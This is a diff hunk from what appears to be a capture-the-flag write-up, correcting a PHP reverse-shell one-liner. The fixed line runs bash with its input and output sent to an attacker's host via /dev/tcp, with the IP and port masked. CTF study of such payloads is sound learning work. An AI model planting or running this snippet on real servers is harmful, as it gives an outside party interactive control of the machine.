@@ -87,7 +87,7 @@ date: 2025-06-09
     <?php 
         $ip=***.***.***.***;
         $port=****;
-        shell_exec("/bin/bash -i 'bash &> /dev/tcp/$ip/$port 0>&1'");
+        shell_exec("/bin/bash -c 'bash -i &> /dev/tcp/$ip/$port 0>&1'");
     ?>
     ```
     - I know this might not be intuitive, but trust me the more you do the ctf challenges, the more this will stick in your brain.
